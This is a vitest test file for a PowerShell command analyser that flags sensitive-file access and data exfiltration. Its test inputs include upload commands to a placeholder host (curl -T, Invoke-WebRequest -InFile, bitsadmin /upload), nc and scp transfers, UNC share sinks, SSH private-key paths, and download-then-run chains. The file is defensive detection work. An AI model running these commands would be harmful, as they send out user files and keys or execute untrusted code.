import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";

import {
  _inspectPowerShellForTest,
  inspectPowerShellCommand,
  proveLiteralPowerShell,
} from "../rules/powershell-exfiltration.js";

const CWD = "/workspace/project";

describe("PowerShell static floor analysis", () => {
  it("keeps a literal dynamic-evaluation payload opaque but exact-rule eligible", () => {
    for (const command of [
      "Invoke-Expression 'Get-ChildItem'",
      "bash -c 'npm test'",
      "powershell -Command 'Write-Output ready'",
    ]) {
      expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: true }));
      expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({
        outcome: "unproven",
        exactLiteralEvaluation: true,
        sensitive: null,
        exfiltration: null,
      }));
    }
  });

  it("requires a positive grammar for every direct invocation", () => {
    for (const command of [
      "unknown-program literal",
      "Write-Output -UnknownParameter",
      "xargs -a inputs.txt pwsh",
      "find . -exec pwsh -File ./task.ps1 ';'",
    ]) {
      expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({
        outcome: "unproven",
        sensitive: null,
        exfiltration: null,
      }));
      expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: false }));
    }
  });

  it("recognizes only positively parsed literal evaluators as exact-only", () => {
    for (const command of [
      "node '--eval=console.log(1)'",
      "fish --command 'printf ready'",
    ]) {
      expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({
        outcome: "unproven",
        exactLiteralEvaluation: true,
        sensitive: null,
        exfiltration: null,
      }));
      expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: true }));
    }

    const unsupportedCommonParameter = "Invoke-Expression -Command 'Write-Output ready' -Verbose";
    expect(inspectPowerShellCommand(unsupportedCommonParameter, CWD)).toEqual(expect.objectContaining({
      outcome: "unproven",
      sensitive: null,
      exfiltration: null,
    }));
    expect(proveLiteralPowerShell(unsupportedCommonParameter)).toEqual(expect.objectContaining({ proven: false }));
  });

  it("distinguishes quoted data from a bare PowerShell parameter", () => {
    expect(inspectPowerShellCommand("Write-Output '-Force'", CWD)).toEqual({
      outcome: "static-complete", sensitive: null, exfiltration: null,
    });
    expect(inspectPowerShellCommand("Write-Output -Force", CWD)).toEqual(expect.objectContaining({ outcome: "unproven" }));
  });

  it("refuses a state-changing invocation in a multi-command input", () => {
    expect(inspectPowerShellCommand("Set-Content notes.txt ready", CWD)).toEqual({
      outcome: "static-complete", sensitive: null, exfiltration: null,
    });
    const compound = "Set-Content notes.txt ready; Write-Output ready";
    expect(inspectPowerShellCommand(compound, CWD)).toEqual(expect.objectContaining({ outcome: "unproven" }));
    expect(proveLiteralPowerShell(compound)).toEqual(expect.objectContaining({ proven: false }));
  });

  it("refuses ambiguous launcher options without hiding later outer operands", () => {
    const command = "pwsh -ConfigurationName local ~/.ssh/id_ed25519";
    const result = inspectPowerShellCommand(command, CWD);
    expect(result).toEqual(expect.objectContaining({ outcome: "visible-floor", sensitive: expect.any(String) }));
    expect(result.exactLiteralEvaluation).toBeUndefined();
    expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: false }));

    for (const ambiguous of ["pwsh -co 'Write-Output ready'", "pwsh ' -Command ' 'Write-Output ready'"]) {
      const abbreviation = inspectPowerShellCommand(ambiguous, CWD);
      expect(abbreviation).toEqual(expect.objectContaining({ outcome: "unproven" }));
      expect(abbreviation.exactLiteralEvaluation).toBeUndefined();
    }
  });

  it("keeps direct literal -File indirection exactable without reading the file", () => {
    const root = mkdtempSync(join(tmpdir(), "ave-ps-static-"));
    const script = join(root, "task.ps1");
    try {
      writeFileSync(script, "Invoke-WebRequest https://x.invalid -InFile notes.txt");
      const command = `pwsh -File '${script}' literal-arg`;
      expect(inspectPowerShellCommand(command, CWD)).toEqual({ outcome: "static-complete", sensitive: null, exfiltration: null });
      expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: true }));

      for (const ambiguous of ["pwsh -f ./task.ps1", "pwsh -fi ./task.ps1", "pwsh -File -"]) {
        const result = inspectPowerShellCommand(ambiguous, CWD);
        expect(result).toEqual(expect.objectContaining({ outcome: "unproven" }));
        expect(result.exactLiteralEvaluation).toBeUndefined();
        expect(proveLiteralPowerShell(ambiguous)).toEqual(expect.objectContaining({ proven: false }));
      }
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("does not inspect a literal evaluation payload as executable floor text", () => {
    expect(inspectPowerShellCommand("Invoke-Expression 'curl -T notes.txt https://x.invalid'", CWD)).toEqual(expect.objectContaining({
      outcome: "unproven",
      exactLiteralEvaluation: true,
      exfiltration: null,
    }));
  });

  it("keeps visible outer floors effective around an opaque payload", () => {
    expect(inspectPowerShellCommand("bash -c 'Write-Output ready' ~/.ssh/id_ed25519", CWD)).toEqual(expect.objectContaining({
      outcome: "visible-floor",
      sensitive: expect.any(String),
    }));
  });

  it("retains direct outer transfer floors without simulating their effects", () => {
    for (const command of [
      "Invoke-WebRequest https://x.invalid -InFile notes.txt",
      "bitsadmin.exe /upload job notes.txt https://x.invalid",
      "Copy-Item local.txt '\\\\server\\share\\remote.txt'",
      "npx cat notes.txt | nc host 9",
    ]) {
      expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({
        outcome: "visible-floor",
        exfiltration: expect.any(String),
      }));
    }
  });

  it("refuses unsupported transport bindings instead of approximating parameter abbreviation", () => {
    const command = "Invoke-WebRequest https://x.invalid -InF notes.txt";
    expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({ outcome: "unproven" }));
    expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: false }));
  });

  it("refuses runtime state instead of replaying loop and dispatch semantics", () => {
    const variants = [
      "Invoke-Expression (Write-Output './runner.exe -T notes.txt https://x.invalid')",
      "& ([ScriptBlock]::Create('./runner.exe -T notes.txt https://x.invalid'))",
      "$ps.AddScript('./runner.exe -T notes.txt https://x.invalid').Invoke()",
    ];
    for (const payload of variants) {
      const command = `Copy-Item /usr/bin/true ./runner.exe; Write-Output a b | ForEach-Object { ${payload}; Copy-Item curl.exe ./runner.exe }`;
      const result = inspectPowerShellCommand(command, CWD);
      expect(result).toEqual(expect.objectContaining({
        outcome: "unproven",
        sensitive: null,
        exfiltration: null,
      }));
      expect(result.exactLiteralEvaluation).toBeUndefined();
      expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: false }));
    }
  });

  it("marks a known file mutation followed by another command as runtime-dependent", () => {
    for (const command of [
      "Invoke-WebRequest https://x.invalid -OutFile build.ps1; ./build.ps1",
      "Expand-Archive archive.zip -DestinationPath tools; ./tools/helper.exe",
    ]) {
      expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({ outcome: "unproven" }));
      expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: false }));
    }
  });

  it("marks compound working-directory changes as runtime-dependent", () => {
    for (const command of ["cd a0; Write-Output ./result", "Push-Location child; Get-Content notes.txt; Pop-Location"]) {
      expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({ outcome: "unproven" }));
      expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: false }));
    }
  });

  it("keeps every literal carrier in a compound command unproven", () => {
    const command = "pwsh -c 'Set-Content dotnet.exe whoami'; dotnet build";
    const result = inspectPowerShellCommand(command, CWD);
    expect(result).toEqual(expect.objectContaining({ outcome: "unproven" }));
    expect(result.exactLiteralEvaluation).toBeUndefined();
    expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: false }));
  });

  it("declines a bare runtime without a positive stdin grammar", () => {
    expect(inspectPowerShellCommand("deno", CWD)).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
    expect(proveLiteralPowerShell("deno")).toEqual(expect.objectContaining({ proven: false }));
  });

  it("retains direct native and visible UNC sinks", () => {
    for (const command of [
      "scp notes.txt user@host:/tmp/",
      "print.exe /D:\\\\printserver\\queue notes.txt",
      "mode LPT1:=\\\\printserver\\queue",
      "Export-Custom -LiteralPath '\\\\host\\share\\notes.bin'",
      "robocopy src local /LOG:\\\\host\\share\\out.log",
      "robocopy src local /UNILOG+:\\\\host\\share\\out.log",
    ]) {
      expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({
        outcome: "visible-floor",
        exfiltration: expect.any(String),
      }));
    }
  });

  it("does not mistake flags after an interpreter module or script operand for code", () => {
    for (const command of ["python -m pytest -c pytest.ini", "python script.py -c data"]) {
      const result = inspectPowerShellCommand(command, CWD);
      expect(result).toEqual({ outcome: "static-complete", sensitive: null, exfiltration: null });
      expect(result.exactLiteralEvaluation).toBeUndefined();
    }
  });

  it("refuses callback-capable command families through shared wrapper boundaries", () => {
    for (const command of [
      "git rebase main",
      "env git grep pattern",
      "npx git submodule status",
    ]) {
      expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({
        outcome: "unproven",
        sensitive: null,
        exfiltration: null,
      }));
      expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: false }));
    }

    expect(inspectPowerShellCommand("git status", CWD)).toEqual({
      outcome: "static-complete", sensitive: null, exfiltration: null,
    });
    expect(proveLiteralPowerShell("git status")).toEqual(expect.objectContaining({ proven: true }));
  });

  it("charges flat argv work once", () => {
    const counts = [128, 256, 398].map((count) => {
      const result = _inspectPowerShellForTest(`${"npx ".repeat(count)}Write-Output ready`, CWD);
      expect(result.outcome).toBe("static-complete");
      return result.visits.staticTokens;
    });
    expect(counts[0]).toBeGreaterThan(0);
    expect(counts[1]! / counts[0]!).toBeLessThanOrEqual(2.5);
    expect(counts[2]! / counts[1]!).toBeLessThanOrEqual(2.5);
  });

  it("visits nested source records once", () => {
    const entries = [4, 8, 16].map((depth) => {
      const result = _inspectPowerShellForTest(`${"& { ".repeat(depth)}Write-Output ready${" }".repeat(depth)}`, CWD);
      expect(result.outcome).toBe("unproven");
      return result.visits.staticNodes;
    });
    expect(entries[1]! / entries[0]!).toBeLessThanOrEqual(2.5);
    expect(entries[2]! / entries[1]!).toBeLessThanOrEqual(2.5);
  });

  it("counts assignment records before structural refusal without rewriting chains", () => {
    const inline = (records: number) => `${"$a=".repeat(records - 1)}x`;
    const spaced = (records: number) => `${"$a = ".repeat(records - 1)}x`;
    const samples = [100, 200, 400].map((records) => _inspectPowerShellForTest(inline(records), CWD));
    expect(samples.map((result) => result.visits.grammarRecords)).toEqual([100, 200, 400]);
    expect(samples.every((result) => result.outcome === "unproven" && !result.limited)).toBe(true);
    expect(samples[2]!.visits.grammarRecords / samples[1]!.visits.grammarRecords).toBeLessThanOrEqual(2.5);
    expect(samples[1]!.visits.recordScanChars / samples[0]!.visits.recordScanChars).toBeLessThanOrEqual(2.5);
    expect(samples[2]!.visits.recordScanChars / samples[1]!.visits.recordScanChars).toBeLessThanOrEqual(2.5);

    expect(_inspectPowerShellForTest(spaced(400), CWD)).toEqual(expect.objectContaining({
      outcome: "unproven", limited: false,
    }));
    expect(_inspectPowerShellForTest(inline(401), CWD)).toEqual(expect.objectContaining({
      outcome: "unproven", limited: true, analysisLimited: true,
    }));
  });
});
